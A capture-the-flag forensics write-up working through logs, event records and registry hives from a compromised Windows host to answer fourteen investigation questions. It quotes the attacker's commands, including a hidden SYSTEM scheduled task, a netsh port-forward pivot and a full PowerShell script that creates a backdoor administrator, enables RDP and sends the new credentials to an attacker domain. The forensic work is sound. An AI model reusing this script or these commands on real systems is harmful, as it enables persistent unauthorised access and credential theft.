# The Enduring Echo

```
LeStrade passes a disk image artifacts to Watson. It's one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.
```

## Question #1

```
What was the first (non cd) command executed by the attacker on the host? (string)
```

Answer in `MPLog-20250421-104305.log`:

```
2025-08-24T22:50:59.773 [NRI] Successfully updated NIS service with platform settings for enforcement level Log
Internal signature match:subtype=Lowfi, sigseq=0x0001CBD78CB6CDD5, sigsha=42fd2331d60fbfa863259d427ac5eea278f155fb, cached=false, source=0, resourceid=0xee3657a0
2025-08-24T22:51:09.179 Engine:command line reported as lowfi: C:\Windows\System32\cmd.exe(cmd.exe /Q /c systeminfo 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1)
2025-08-24T22:51:09.211 Using signature default action MP_THREAT_ACTION_ALLOW(6) for special threatID: 0x565c7b9a7ffffffe
2025-08-24T22:51:14.242 UnknownTelemetryScan triggered, type: 2 (1 - Unknown, 2- Lofi), flags: 0 (0 - Regular, 1 - MemScan), 1 resources, RtpIoavOnly: FALSE
```

## Question #2

```
Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)
```

Answer:

1. open `C/Windows/System32/winevt/logs/Security.evtx` in <https://omerbenamram.github.io/evtx/>
2. export logs as json
3. grep `systeminfo` in exported json

```
      "EventData": {
        "SubjectUserSid": "S-1-5-20",
        "SubjectUserName": "HEISEN-9-WS-6$",
        "SubjectDomainName": "WORKGROUP",
        "SubjectLogonId": "0x3e4",
        "NewProcessId": "0x1300",
        "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
        "TokenElevationType": "%%1936",
        "ProcessId": "0xf34",
        "CommandLine": "cmd.exe /Q /c systeminfo 1> \\\\127.0.0.1\\ADMIN$\\__1756075857.955773 2>&1",
        "TargetUserSid": "S-1-0-0",
        "TargetUserName": "Werni",
        "TargetDomainName": "HEISEN-9-WS-6",
        "TargetLogonId": "0x4373b0",
        "ParentProcessName": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
        "MandatoryLabel": "S-1-16-12288"
      }
```

Alternatively, use command line version of evtx:

```shell
cargo install evtx
evtx_dump -o json ./Security.evtx
```

Dump all `evtx` files under the current directory:

```shell
fd -e evtx -x evtx_dump -o json > dump.log
```

## Question #3

```
Which remote-execution tool was most likely used for the attack? (filename.ext)
```

Answer:

Search for `WmiPrvSE.exe` online:

```
WmiExec.py (WmiExec) is one of the Impacket widely used tool among red teams and threat actors.
```

## Question #4

```
What was the attacker’s IP address? (IPv4 address)
```

Answer in `MPLog-20250421-104305.log`:

```
2025-08-24T23:00:13.695 IWscASStatus::UpdateStatus() succceeded writing instance with state (0), snooze state (0), and up-to-date state(1)
Internal signature match:subtype=Lowfi, sigseq=0x0001CBD78CB6CDD5, sigsha=42fd2331d60fbfa863259d427ac5eea278f155fb, cached=false, source=0, resourceid=0xbb403085
2025-08-24T23:00:15.195 Engine:command line reported as lowfi: C:\Windows\System32\cmd.exe(cmd.exe /Q /c cmd /C echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1)
2025-08-24T23:00:15.242 Using signature default action MP_THREAT_ACTION_ALLOW(6) for special threatID: 0x565c7b9a7ffffffe
```

## Question #5

```
What is the first element in the attacker's sequence of persistence mechanisms? (string)
```

Answer in `MPLog-20250421-104305.log`:

```
2025-08-24T23:02:42.367 [NRI] Successfully updated NIS service with platform settings for enforcement level Log
Internal signature match:subtype=Lowfi, sigseq=0x0001CBD78CB6CDD5, sigsha=42fd2331d60fbfa863259d427ac5eea278f155fb, cached=false, source=0, resourceid=0xb52f7037
2025-08-24T23:03:50.257 Engine:command line reported as lowfi: C:\Windows\System32\cmd.exe(cmd.exe /Q /c schtasks /create /tn SysHelper Update /tr powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1 /sc minute /mo 2 /ru SYSTEM /f 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1)
```

```
SysHelper Update
```

## Question #6

```
Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)
```

Answer in `MPLog-20250421-104305.log`:

```
2025-08-24T23:02:42.367 [NRI] Successfully updated NIS service with platform settings for enforcement level Log
Internal signature match:subtype=Lowfi, sigseq=0x0001CBD78CB6CDD5, sigsha=42fd2331d60fbfa863259d427ac5eea278f155fb, cached=false, source=0, resourceid=0xb52f7037
2025-08-24T23:03:50.257 Engine:command line reported as lowfi: C:\Windows\System32\cmd.exe(cmd.exe /Q /c schtasks /create /tn SysHelper Update /tr powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1 /sc minute /mo 2 /ru SYSTEM /f 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1)
```

## Question #7

```
What local account did the attacker create? (string)
```

Answer in `JM.ps1`:

```powershell
# List of potential usernames
$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")

# Check for existing user
$existing = $usernames | Where-Object {
    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
}

# If none exist, create a new one
if (-not $existing) {
    $newUser = Get-Random -InputObject $usernames
    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
    $password = "Watson_$timestamp"

    $securePass = ConvertTo-SecureString $password -AsPlainText -Force

    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
    Add-LocalGroupMember -Group "Administrators" -Member $newUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser

    # Enable RDP
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
```

and security.evtx:

```json
      "EventData": {
        "TargetUserName": "svc_netupd",
        "TargetDomainName": "HEISEN-9-WS-6",
        "TargetSid": "S-1-5-21-3871582759-1638593395-315824688-1003",
        "SubjectUserSid": "S-1-5-18",
        "SubjectUserName": "HEISEN-9-WS-6$",
        "SubjectDomainName": "WORKGROUP",
        "SubjectLogonId": "0x3e7",
        "PrivilegeList": "-",
        "SamAccountName": "svc_netupd",
```

## Question #8

```
What domain name did the attacker use for credential exfiltration? (domain)
```

Answer:

`NapoleonsBlackPearl.htb` shown in above powershell script.

## Question #9

```
What password did the attacker's script generate for the newly created user? (string)
```

Answer:

From `JM.ps1`:

```powershell
    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
    $password = "Watson_$timestamp"
```

From Security.evtx:

```json
        "TimeCreated_attributes": {
          "SystemTime": "2025-08-24T23:05:09.764658Z"
        },
        "EventRecordID": 4461,
        "Correlation_attributes": {
          "ActivityID": "9F5B5735-1548-0001-A457-5B9F4815DC01"
        },
        "Execution_attributes": {
          "ProcessID": 688,
          "ThreadID": 5796
        },
        "Channel": "Security",
        "Computer": "Heisen-9-WS-6",
        "Security": null
      },
      "EventData": {
        "TargetUserName": "svc_netupd",
        "TargetDomainName": "HEISEN-9-WS-6",
        "TargetSid": "S-1-5-21-3871582759-1638593395-315824688-1003",
```

Timezone is UTC-7 from the time delta in MPLog:

```
2025-04-21T10:47:49.009Z OnMountDetection for \Device\Harddisk0\DR0 ...
Engine:Triggered BM EMS scan (ppids:{{652, 1012028063, 31175397}}), sigseq=0x85B39B5453E0


BEGIN BM telemetry
GUID:{6A4F7F1C-9C39-DE9A-55A7-4B4777380B24}
TelemetryName:Behavior:Win32/SvchostInject.A
SignatureID:147006451635168
ProcessID:652
ProcessCreationTime:133897311566844575
SessionID:0
CreationTime:04-21-2025 03:48:01
ImagePath:C:\Windows\System32\services.exe
ImagePathHash:E6FE9A94E8686E957DBCEC2B89C1C1DDCF8E75D76E9200D0CBEF74D510C71317
END BM telemetry
```

Result:

```
Watson_20250824160509
```

## Question #10

```
What was the IP address of the internal system the attacker pivoted to? (IPv4 address)
```

Answer in Security.evtx:

```json
      "EventData": {
        "SubjectUserSid": "S-1-5-21-3871582759-1638593395-315824688-500",
        "SubjectUserName": "Administrator",
        "SubjectDomainName": "HEISEN-9-WS-6",
        "SubjectLogonId": "0x4804c",
        "NewProcessId": "0x1e94",
        "NewProcessName": "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
        "TokenElevationType": "%%1936",
        "ProcessId": "0x1cb4",                                                          "CommandLine": "ssh  felamos@192.168.1.101",                                    "TargetUserSid": "S-1-0-0",
        "TargetUserName": "-",
        "TargetDomainName": "-",
        "TargetLogonId": "0x0",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "MandatoryLabel": "S-1-16-12288"
      }
```

## Question #11

```
Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)
```

Answer in Security.evtx:

```json
      "EventData": {
        "SubjectUserSid": "S-1-5-21-3871582759-1638593395-315824688-1002",
        "SubjectUserName": "Werni",
        "SubjectDomainName": "HEISEN-9-WS-6",                                           "SubjectLogonId": "0x795fc3",                                                   "NewProcessId": "0x125c",
        "NewProcessName": "C:\\Windows\\System32\\netsh.exe",
        "TokenElevationType": "%%1936",
        "ProcessId": "0x6a8",
        "CommandLine": "netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22",
        "TargetUserSid": "S-1-0-0",
        "TargetUserName": "-",                                                          "TargetDomainName": "-",                                                        "TargetLogonId": "0x0",                                                         "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "MandatoryLabel": "S-1-16-12288"
      }
```

## Question #12

```
What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM\...\...)
```

Answer:

Search for `netsh interface portproxy add v4tov4 HKLM`:

```
port proxy rules are stored in the registry under HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
```

Dump content:

```shell
$ /sbin/reged -x $PWD/C/Windows/System32/config/SYSTEM HKEY_LOCAL_MACHINE \\ output.reg
$ cat output.reg
[HKEY_LOCAL_MACHINE\ControlSet001\Services\PortProxy]

[HKEY_LOCAL_MACHINE\ControlSet001\Services\PortProxy\v4tov4]

[HKEY_LOCAL_MACHINE\ControlSet001\Services\PortProxy\v4tov4\tcp]
"0.0.0.0/9999"="192.168.1.101/22"
```

## Question #13

```
What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)
```

Answer:

Search for `mitre att&ck proxy attack`, got <https://attack.mitre.org/techniques/T1090/>:

```
T1090.001 Internal Proxy
```

## Question #14

```
Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)
```

Answer in `ConsoleHost_history.txt`:

```shell
auditpol /set /subcategory:"Process Creation" /success:enable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

View registry content:

```shell
$ /sbin/reged -x $PWD/C/Windows/System32/config/SOFTWARE HKEY_LOCAL_MACHINE \\ software.reg
$ cat software.reg
[HKEY_LOCAL_MACHINE\Microsoft\Windows\CurrentVersion\Policies\System\Audit]
"ProcessCreationIncludeCmdLine_Enabled"=dword:00000001
```
